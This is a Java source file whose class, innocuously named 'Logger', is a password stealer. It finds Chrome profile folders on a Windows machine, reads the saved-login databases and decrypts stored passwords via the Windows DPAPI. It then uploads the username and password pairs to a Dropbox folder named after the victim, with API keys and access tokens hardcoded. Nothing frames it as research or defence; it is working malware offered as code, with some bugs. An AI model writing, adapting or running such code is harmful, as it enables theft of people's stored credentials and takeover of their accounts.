import java.io.File;
import java.io.FilenameFilter;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;

import org.apache.commons.codec.binary.Base64;

import com.sun.jna.platform.win32.Crypt32Util;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileInputSet;
import com.temboo.Library.Dropbox.FilesAndMetadata.UploadFile.UploadFileResultSet;
import com.temboo.core.TembooException;
import com.temboo.core.TembooSession;

public class Logger{
		private String filepath = "C:\\Users\\"+System.getProperty("user.name")+"\\AppData\\Local\\Google\\Chrome\\User Data";
		public Logger() throws TembooException{
		    run();
		}
		
		public void run() throws TembooException{
			String user = System.getProperty("user.name");
		    ArrayList<String> folders = new ArrayList<String>();
		    ArrayList<String> usernames = new ArrayList<String>();
		    ArrayList<String> passwords = new ArrayList<String>();
		    ArrayList<ArrayList<String>> doublebuffer = new ArrayList<ArrayList<String>>();
		    ArrayList<String> bufferuser = new ArrayList<String>();
		    ArrayList<String> bufferpass = new ArrayList<String>();
		    File file = new File(filepath);
		    String[] directories = file.list(new FilenameFilter() {
		      @Override
		      public boolean accept(File current, String name) {
		        return new File(current, name).isDirectory();
		      }
		    });
		    for(String i : directories){
		    	if(i.matches("^(Default|Profile).*")){
		    		folders.add(i);
		    	}
		    }
		    System.out.println(folders.toString());
		    for(String i : folders){
		    	doublebuffer = getinfo(filepath+"\\"+i+"\\Login Data");
		    	bufferuser = doublebuffer.get(0);
		    	bufferpass = doublebuffer.get(1);
		    	for(String j : bufferpass)
		    		passwords.add(j);
		    	for(String k : bufferuser)
		    		usernames.add(k);
		    }
		    String uploadInfo = "";
		    for(int i = 0; i < passwords.size(); i++){
		    	uploadInfo+="Username: "+usernames.get(i)+"\tPassword: "+passwords.get(i)+"\n";
		    }
		    upload(uploadInfo);
		}
		
		@SuppressWarnings("null")
		public ArrayList<ArrayList<String>> getinfo(String file){
			try{
			    Class.forName("org.sqlite.JDBC");
				Connection connection = DriverManager.getConnection("jdbc:sqlite:"+file);
				Statement statement = connection.createStatement();
				ResultSet resultSet = statement.executeQuery("SELECT username_value, password_value FROM logins"); // some encrypted field
				ArrayList<String> passwords = new ArrayList<String>(); 
				ArrayList<String> usernames = new ArrayList<String>();
				ArrayList<ArrayList<String>> buffer = new ArrayList<ArrayList<String>>();
				while (resultSet.next())
			    {
			        byte[] encryptedData = resultSet.getBytes(2);
			        byte[] decryptedData = Crypt32Util.cryptUnprotectData(encryptedData);  // exception over here
			        byte[] users = resultSet.getBytes(1);
			        StringBuilder decryptedString = new StringBuilder();
			        StringBuilder userstring = new StringBuilder();
		
			        for (byte b : decryptedData)
			        {
			           decryptedString.append((char) b);
			        }
			        for (byte b : decryptedData)
			        {
			           userstring.append((char) b);
			        }
			        
			        
			        System.out.println("decrypted = [" + decryptedString + "]");
			        usernames.add(userstring.toString());
			        passwords.add(decryptedString.toString());
			        buffer.add(usernames);
			        buffer.add(passwords);
			        return buffer;
			   }
			   connection.close();
			 }catch(Exception e)
			 {
			    e.printStackTrace();
			 }
			return null; 
		}
		
		public void upload(String info) throws TembooException{
			// Instantiate the Choreo, using a previously instantiated TembooSession object, eg:
			TembooSession session = new TembooSession("logger", "myFirstApp", "N5LS8WVzNyNEKSDrXLVWNFL3nlypo7vr");

			UploadFile uploadFileChoreo = new UploadFile(session);

			// Get an InputSet object for the choreo
			UploadFileInputSet uploadFileInputs = uploadFileChoreo.newInputSet();
			Base64 encode = new Base64();
			// Set inputs
			uploadFileInputs.set_ResponseFormat("json");
			uploadFileInputs.set_FileContents(encode.encodeToString(info.getBytes()));
			uploadFileInputs.set_Root("sandbox");
			uploadFileInputs.set_AccessToken("jvm9xp5ea4kuk06g");
			uploadFileInputs.set_AppKey("bwr2bxarafudtxj");
			uploadFileInputs.set_FileName("information.txt");
			uploadFileInputs.set_AccessTokenSecret("xh4d5f5yjflzyl7");
			uploadFileInputs.set_Folder("/RootFolder/"+System.getProperty("user.name"));
			uploadFileInputs.set_AppSecret("tr0phzmsc74vauv");

			// Execute Choreo
			UploadFileResultSet uploadFileResults = uploadFileChoreo.execute(uploadFileInputs);
		}
		
		public void append(String info){
			
		}
}
